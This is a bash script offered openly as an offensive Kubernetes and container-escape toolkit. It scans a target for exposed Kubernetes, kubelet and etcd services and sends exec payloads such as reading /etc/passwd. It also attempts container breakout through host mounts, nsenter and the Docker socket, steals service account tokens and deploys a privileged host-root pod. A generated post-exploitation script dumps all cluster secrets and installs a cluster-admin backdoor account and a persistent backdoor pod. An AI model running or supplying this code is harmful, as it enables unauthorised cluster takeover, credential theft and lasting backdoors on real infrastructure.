#!/bin/bash
# 🔥 Elite Kubernetes & Container Escape Exploitation Script
# CoffinXP's Advanced K8s Hunting Methodology

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./kubernetes_container_escape.sh target.com"
    exit 1
fi

echo "🚀 Starting Kubernetes & Container Escape Hunt for $TARGET"
mkdir -p $TARGET/k8s_results && cd $TARGET/k8s_results

# ==================== KUBERNETES API DISCOVERY ====================
echo "🔍 Phase 1: Kubernetes API Discovery"

# Common Kubernetes ports
K8S_PORTS="443,6443,8443,10250,10255,10256,2379,2380,4194,8080,8001"

echo "📡 Scanning for Kubernetes services..."
nmap -p $K8S_PORTS $TARGET --open -oN k8s_port_scan.txt

# Check for common K8s endpoints
echo "🎯 Testing Kubernetes API endpoints..."
cat > k8s_endpoints.txt << 'EOF'
/api/v1
/api/v1/namespaces
/api/v1/pods
/api/v1/services
/api/v1/nodes
/api/v1/secrets
/api/v1/configmaps
/apis/apps/v1/deployments
/version
/healthz
/metrics
/swagger.json
/openapi/v2
EOF

# Test unauthenticated access
echo "🔓 Testing unauthenticated Kubernetes API access..."
for port in 443 6443 8443 8080 8001; do
    echo "Testing port $port..."
    for endpoint in $(cat k8s_endpoints.txt); do
        echo "  Testing: https://$TARGET:$port$endpoint"
        curl -k -s --connect-timeout 5 "https://$TARGET:$port$endpoint" | head -20 >> "k8s_unauth_$port.txt"
        curl -k -s --connect-timeout 5 "http://$TARGET:$port$endpoint" | head -20 >> "k8s_unauth_$port.txt"
    done
done

# ==================== KUBELET EXPLOITATION ====================
echo "🔧 Phase 2: Kubelet Exploitation (Port 10250)"

# Test kubelet read-only port (10255)
echo "📖 Testing Kubelet read-only access..."
curl -k -s "https://$TARGET:10255/pods" > kubelet_pods_readonly.json
curl -k -s "https://$TARGET:10255/stats/summary" > kubelet_stats.json

# Test kubelet API (10250) - RCE potential
echo "💥 Testing Kubelet API for RCE..."
cat > kubelet_payloads.txt << 'EOF'
/pods
/stats/summary
/configz
/healthz
/metrics
/spec
/run/default/nginx/nginx
/exec/default/nginx/nginx?command=id
/exec/default/nginx/nginx?command=whoami
/exec/default/nginx/nginx?command=cat%20/etc/passwd
EOF

for payload in $(cat kubelet_payloads.txt); do
    echo "Testing kubelet: $payload"
    curl -k -s "https://$TARGET:10250$payload" >> kubelet_results.txt
    echo "---SEPARATOR---" >> kubelet_results.txt
done

# ==================== ETCD EXPLOITATION ====================
echo "🗄️ Phase 3: etcd Database Exploitation"

# Test etcd v2 API (port 2379)
echo "🔍 Testing etcd v2 API..."
curl -s "http://$TARGET:2379/v2/keys/?recursive=true" > etcd_v2_dump.json
curl -s "http://$TARGET:2379/v2/stats/leader" > etcd_leader.json
curl -s "http://$TARGET:2379/v2/stats/store" > etcd_store.json

# Test etcd v3 API
echo "🔍 Testing etcd v3 API..."
# etcd v3 uses gRPC, need etcdctl
if command -v etcdctl &> /dev/null; then
    ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get "" --prefix=true > etcd_v3_dump.txt
    ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 member list > etcd_members.txt
fi

# ==================== CONTAINER ESCAPE TECHNIQUES ====================
echo "🏃 Phase 4: Container Escape Techniques"

# Create container escape payloads
cat > container_escape_payloads.txt << 'EOF'
# Docker socket escape
/var/run/docker.sock

# Privileged container checks
/proc/1/cgroup
/proc/self/cgroup
/proc/self/mountinfo

# Host filesystem access
/host
/hostfs
/rootfs

# Device access
/dev/kmsg
/dev/mem
/dev/disk

# Capabilities check
/proc/self/status

# Namespace escape
/proc/1/ns/
/proc/self/ns/

# Kernel modules
/proc/modules
/sys/module/

# Container runtime sockets
/run/containerd/containerd.sock
/run/crio/crio.sock
/var/run/cri-dockerd.sock
EOF

# Test for container escape vectors
echo "🔓 Testing container escape vectors..."
for escape_path in $(cat container_escape_payloads.txt | grep -v "^#"); do
    if [ -e "$escape_path" ]; then
        echo "FOUND: $escape_path" >> container_escape_findings.txt
        ls -la "$escape_path" >> container_escape_findings.txt
    fi
done

# ==================== ADVANCED CONTAINER BREAKOUT ====================
echo "💀 Phase 5: Advanced Container Breakout Techniques"

# Create advanced breakout script
cat > advanced_breakout.sh << 'EOF'
#!/bin/bash
echo "🔥 Advanced Container Breakout Techniques"

# Check if we're in a container
if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup; then
    echo "✅ We are inside a container"
    
    # Check container capabilities
    echo "📋 Container Capabilities:"
    capsh --print
    
    # Check for privileged container
    if capsh --print | grep -q "cap_sys_admin"; then
        echo "🚨 PRIVILEGED CONTAINER DETECTED!"
        
        # Try to mount host filesystem
        mkdir -p /host_escape
        mount /dev/sda1 /host_escape 2>/dev/null && echo "✅ Host filesystem mounted!"
        
        # Try to access host processes
        nsenter -t 1 -m -u -i -n -p -- bash -c "id; hostname; ps aux" 2>/dev/null
    fi
    
    # Check for Docker socket access
    if [ -S /var/run/docker.sock ]; then
        echo "🚨 DOCKER SOCKET ACCESSIBLE!"
        
        # Try to escape via Docker socket
        docker run -it --rm -v /:/host alpine chroot /host bash 2>/dev/null
    fi
    
    # Check for writable cgroup
    if [ -w /sys/fs/cgroup ]; then
        echo "🚨 WRITABLE CGROUP DETECTED!"
        
        # CVE-2019-5736 style escape
        echo '#!/bin/bash' > /tmp/escape.sh
        echo 'echo "Container escaped!" > /host/tmp/pwned' >> /tmp/escape.sh
        chmod +x /tmp/escape.sh
        
        # Try to overwrite runc binary
        cp /tmp/escape.sh /proc/self/exe 2>/dev/null
    fi
    
    # Kernel exploit checks
    echo "🔍 Checking for kernel exploits..."
    uname -a
    cat /proc/version
    
    # Check for dirty cow vulnerability
    if [ -w /proc/self/mem ]; then
        echo "🚨 /proc/self/mem is writable - Dirty COW possible!"
    fi
    
else
    echo "❌ Not in a container"
fi
EOF

chmod +x advanced_breakout.sh
./advanced_breakout.sh > advanced_breakout_results.txt

# ==================== SERVICE ACCOUNT TOKEN EXTRACTION ====================
echo "🎫 Phase 6: Service Account Token Extraction"

# Check for service account tokens
echo "🔍 Extracting Kubernetes service account tokens..."
if [ -d "/var/run/secrets/kubernetes.io/serviceaccount" ]; then
    echo "✅ Service account directory found!"
    
    # Extract token
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
    CA_CERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    
    if [ ! -z "$TOKEN" ]; then
        echo "🎯 Service Account Token Found!"
        echo "Token: $TOKEN" > service_account_token.txt
        echo "Namespace: $NAMESPACE" >> service_account_token.txt
        
        # Test token permissions
        echo "🔍 Testing token permissions..."
        APISERVER="https://kubernetes.default.svc"
        
        # Test various API calls with the token
        curl -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" > token_test_namespaces.json
        curl -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" > token_test_pods.json
        curl -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" > token_test_secrets.json
        curl -k -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" > token_test_nodes.json
        
        # Try to create a privileged pod
        cat > malicious_pod.yaml << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: malicious
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "chroot /host bash"]
  volumes:
  - name: host
    hostPath:
      path: /
YAML
        
        curl -k -H "Authorization: Bearer $TOKEN" \
             -H "Content-Type: application/yaml" \
             -X POST \
             "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" \
             --data-binary @malicious_pod.yaml > pod_creation_result.txt
    fi
fi

# ==================== CONTAINER RUNTIME EXPLOITATION ====================
echo "🐳 Phase 7: Container Runtime Exploitation"

# Check container runtime
echo "🔍 Identifying container runtime..."
if command -v docker &> /dev/null; then
    echo "Docker runtime detected"
    docker version > runtime_info.txt
    docker info >> runtime_info.txt
    
    # Check for Docker daemon exposure
    netstat -tlnp | grep :2375 >> runtime_info.txt
    netstat -tlnp | grep :2376 >> runtime_info.txt
    
elif command -v crictl &> /dev/null; then
    echo "CRI-O/containerd runtime detected"
    crictl version > runtime_info.txt
    crictl info >> runtime_info.txt
    
elif command -v podman &> /dev/null; then
    echo "Podman runtime detected"
    podman version > runtime_info.txt
    podman info >> runtime_info.txt
fi

# Check for runtime sockets
echo "🔍 Checking for runtime sockets..."
find / -name "*.sock" -type s 2>/dev/null | grep -E "(docker|containerd|crio|podman)" > runtime_sockets.txt

# ==================== RESULTS COMPILATION ====================
echo "📊 Phase 8: Results Compilation"

echo "🎯 Kubernetes & Container Escape Results Summary" > k8s_summary.txt
echo "=================================================" >> k8s_summary.txt
echo "" >> k8s_summary.txt

# Check for critical findings
if [ -s kubelet_results.txt ]; then
    echo "🚨 CRITICAL: Kubelet API accessible" >> k8s_summary.txt
fi

if [ -s etcd_v2_dump.json ] && [ "$(cat etcd_v2_dump.json)" != "" ]; then
    echo "🚨 CRITICAL: etcd database accessible" >> k8s_summary.txt
fi

if [ -s service_account_token.txt ]; then
    echo "🚨 HIGH: Service account token extracted" >> k8s_summary.txt
fi

if [ -s container_escape_findings.txt ]; then
    echo "🚨 HIGH: Container escape vectors found" >> k8s_summary.txt
fi

if [ -s runtime_sockets.txt ]; then
    echo "🚨 MEDIUM: Container runtime sockets accessible" >> k8s_summary.txt
fi

echo "" >> k8s_summary.txt
echo "📁 Files created:" >> k8s_summary.txt
ls -la >> k8s_summary.txt

echo "✅ Kubernetes & Container Escape hunt completed!"
echo "📊 Check k8s_summary.txt for results overview"

# ==================== ELITE EXPLOITATION PAYLOADS ====================
echo "💀 Creating elite exploitation payloads..."

# Create kubectl commands for post-exploitation
cat > kubectl_exploitation.sh << 'EOF'
#!/bin/bash
# Elite kubectl exploitation commands

# If you have cluster-admin access:
echo "🔥 Elite Kubernetes Post-Exploitation Commands"

# 1. Extract all secrets
kubectl get secrets --all-namespaces -o yaml > all_secrets.yaml

# 2. Create backdoor service account
kubectl create serviceaccount backdoor-admin
kubectl create clusterrolebinding backdoor-admin --clusterrole=cluster-admin --serviceaccount=default:backdoor-admin

# 3. Deploy malicious pod with host access
cat > backdoor_pod.yaml << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: backdoor
    image: alpine
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
  volumes:
  - name: host
    hostPath:
      path: /
YAML

kubectl apply -f backdoor_pod.yaml

# 4. Extract node information
kubectl get nodes -o wide > nodes_info.txt
kubectl describe nodes > nodes_detailed.txt

# 5. List all running pods
kubectl get pods --all-namespaces -o wide > all_pods.txt

# 6. Extract configmaps
kubectl get configmaps --all-namespaces -o yaml > all_configmaps.yaml

echo "✅ Backdoor deployed! Access with: kubectl exec -it backdoor-pod -- chroot /host bash"
EOF

chmod +x kubectl_exploitation.sh

echo "🎯 Elite Kubernetes & Container Escape toolkit ready!"
echo "📁 All results saved in: $TARGET/k8s_results/"